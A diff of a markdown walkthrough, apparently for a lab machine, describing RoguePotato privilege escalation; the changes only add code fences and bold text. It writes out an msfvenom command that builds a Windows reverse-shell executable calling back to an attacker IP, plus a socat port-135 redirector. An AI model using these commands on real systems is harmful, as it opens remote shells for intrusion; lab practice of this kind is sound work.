@@ -4,7 +4,9 @@ with roguepotato binary we can use get with this approach here, just make this b
 
 ## requirements 
 1. we need to generate a binary on our machine with msfvenom
+```
 command: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe
+```
 ```
 ┌──(alienx㉿alienX)-[~/Desktop/MACHINES/REMOTE]
 └─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.29 LPORT=4444 -a x64 --platform Windows -f exe -o shell.exe                           
@@ -17,7 +19,7 @@ Saved as: shell.exe
 
 2.  we need to run this command on our machine
 
-    command: sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
+    **command**: sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
 ```
 ┌──(alienx㉿alienX)-[~/Desktop/MACHINES/REMOTE]
 └─$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.10.180:9999
